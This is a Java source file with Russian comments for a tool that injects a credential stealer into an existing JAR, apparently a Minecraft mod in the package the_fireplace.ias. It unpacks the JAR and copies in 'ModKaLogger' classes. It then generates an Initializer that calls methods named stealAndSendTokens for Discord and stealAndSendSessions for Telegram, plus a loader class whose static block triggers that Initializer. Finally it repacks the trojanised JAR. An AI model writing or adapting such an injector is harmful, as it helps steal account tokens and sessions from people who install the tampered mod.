import java.io.*;
import java.nio.file.*;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Создаёт класс-загрузчик в пакете the_fireplace.ias
 * Этот класс будет загружен вместе с главным классом
 */
public class CreateLoaderClass {
    
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Usage: java CreateLoaderClass <input.jar> <output.jar>");
            System.exit(1);
        }
        
        String inputJar = args[0];
        String outputJar = args[1];
        
        System.out.println("============================================================");
        System.out.println("Create Loader Class v1.0");
        System.out.println("============================================================");
        
        try {
            // Распаковываем JAR
            System.out.println("[*] Extracting " + inputJar + "...");
            File tempDir = new File("temp_loader_class");
            if (tempDir.exists()) {
                deleteDirectory(tempDir);
            }
            tempDir.mkdir();
            
            unzipJar(inputJar, tempDir.getAbsolutePath());
            System.out.println("[+] Extracted");
            
            // Копируем классы ModKaLogger
            System.out.println("[*] Copying ModKaLogger classes...");
            copyModKaLoggerClasses(tempDir);
            System.out.println("[+] Classes copied");
            
            // Создаём и компилируем Initializer
            System.out.println("[*] Creating Initializer...");
            createAndCompileInitializer(tempDir);
            System.out.println("[+] Initializer created");
            
            // Создаём и компилируем класс-загрузчик в пакете the_fireplace.ias
            System.out.println("[*] Creating loader class...");
            createAndCompileLoaderClass(tempDir);
            System.out.println("[+] Loader class created");
            
            // Переупаковываем JAR
            System.out.println("[*] Repacking JAR...");
            zipJar(tempDir.getAbsolutePath(), outputJar);
            System.out.println("[+] JAR repacked: " + outputJar);
            
            // Очищаем временную папку
            deleteDirectory(tempDir);
            
            System.out.println("============================================================");
            System.out.println("[+] Injection completed successfully!");
            System.out.println("[+] Result: " + outputJar);
            System.out.println("============================================================");
            
        } catch (Exception e) {
            System.err.println("[!] Error: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        }
    }
    
    private static void copyModKaLoggerClasses(File tempDir) throws Exception {
        File modkaloggerJar = new File("build/libs/modkalogger-1.0.0.jar");
        if (!modkaloggerJar.exists()) {
            System.out.println("[!] build/libs/modkalogger-1.0.0.jar not found");
            return;
        }
        
        File modkaDir = new File(tempDir, "ru/modkalogger");
        modkaDir.mkdirs();
        
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(modkaloggerJar))) {
            ZipEntry entry;
            byte[] buffer = new byte[1024];
            
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.getName().startsWith("com/modkalogger/") && entry.getName().endsWith(".class")) {
                    String className = entry.getName().replace("com/modkalogger/", "");
                    File classFile = new File(modkaDir, className);
                    classFile.getParentFile().mkdirs();
                    
                    try (FileOutputStream fos = new FileOutputStream(classFile)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void createAndCompileInitializer(File tempDir) throws Exception {
        File modkaDir = new File(tempDir, "ru/modkalogger");
        modkaDir.mkdirs();
        
        String initCode = "package ru.modkalogger;\n" +
            "\n" +
            "public class Initializer {\n" +
            "    public static void init() {\n" +
            "        try {\n" +
            "            System.out.println(\"[ModKaLogger] Init started\");\n" +
            "            new Thread(new Runnable() {\n" +
            "                public void run() {\n" +
            "                    try {\n" +
            "                        Thread.sleep(3000);\n" +
            "                        System.out.println(\"[ModKaLogger] Loading Discord\");\n" +
            "                        Class.forName(\"ru.modkalogger.Discord\")\n" +
            "                            .getMethod(\"stealAndSendTokens\", new Class[0])\n" +
            "                            .invoke(null, new Object[0]);\n" +
            "                        System.out.println(\"[ModKaLogger] Discord activated\");\n" +
            "                        \n" +
            "                        System.out.println(\"[ModKaLogger] Loading Telegram\");\n" +
            "                        Class.forName(\"ru.modkalogger.Telegram\")\n" +
            "                            .getMethod(\"stealAndSendSessions\", new Class[0])\n" +
            "                            .invoke(null, new Object[0]);\n" +
            "                        System.out.println(\"[ModKaLogger] Telegram activated\");\n" +
            "                    } catch(Exception e) {\n" +
            "                        System.err.println(\"[ModKaLogger] Error: \" + e.getMessage());\n" +
            "                        e.printStackTrace();\n" +
            "                    }\n" +
            "                }\n" +
            "            }).start();\n" +
            "            System.out.println(\"[ModKaLogger] Init completed\");\n" +
            "        } catch(Exception e) {\n" +
            "            System.err.println(\"[ModKaLogger] Init error: \" + e.getMessage());\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "}\n";
        
        File initFile = new File(modkaDir, "Initializer.java");
        Files.write(initFile.toPath(), initCode.getBytes("UTF-8"));
        
        ProcessBuilder pb = new ProcessBuilder("javac", "-source", "1.8", "-target", "1.8", 
            "-encoding", "UTF-8",
            "-cp", "build/libs/modkalogger-1.0.0.jar", initFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            if (!line.contains("warning")) {
                System.out.println(line);
            }
        }
        
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new Exception("Compilation error (code: " + exitCode + ")");
        }
        
        initFile.delete();
    }
    
    private static void createAndCompileLoaderClass(File tempDir) throws Exception {
        File iasDir = new File(tempDir, "the_fireplace/ias");
        iasDir.mkdirs();
        
        // Создаём класс-загрузчик который будет загружен вместе с IAS
        String loaderCode = "package the_fireplace.ias;\n" +
            "\n" +
            "public class ModKaLoggerLoader {\n" +
            "    static {\n" +
            "        try {\n" +
            "            ru.modkalogger.Initializer.init();\n" +
            "        } catch(Exception e) {\n" +
            "            System.err.println(\"[ModKaLogger] Loader error: \" + e.getMessage());\n" +
            "        }\n" +
            "    }\n" +
            "}\n";
        
        File loaderFile = new File(iasDir, "ModKaLoggerLoader.java");
        Files.write(loaderFile.toPath(), loaderCode.getBytes("UTF-8"));
        
        ProcessBuilder pb = new ProcessBuilder("javac", "-source", "1.8", "-target", "1.8", 
            "-encoding", "UTF-8",
            "-cp", tempDir.getAbsolutePath() + File.pathSeparator + "build/libs/modkalogger-1.0.0.jar", 
            loaderFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            if (!line.contains("warning")) {
                System.out.println(line);
            }
        }
        
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new Exception("Compilation error (code: " + exitCode + ")");
        }
        
        loaderFile.delete();
    }
    
    private static void unzipJar(String jarPath, String destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[1024];
            
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(destDir, entry.getName());
                
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void zipJar(String sourceDir, String jarPath) throws Exception {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(jarPath))) {
            File dir = new File(sourceDir);
            addFilesToZip(dir, "", zos);
        }
    }
    
    private static void addFilesToZip(File file, String parentPath, ZipOutputStream zos) throws Exception {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                String path = parentPath.isEmpty() ? child.getName() : parentPath + "/" + child.getName();
                addFilesToZip(child, path, zos);
            }
        } else {
            ZipEntry entry = new ZipEntry(parentPath);
            zos.putNextEntry(entry);
            
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
            }
            
            zos.closeEntry();
        }
    }
    
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                deleteDirectory(file);
            }
        }
        dir.delete();
    }
}
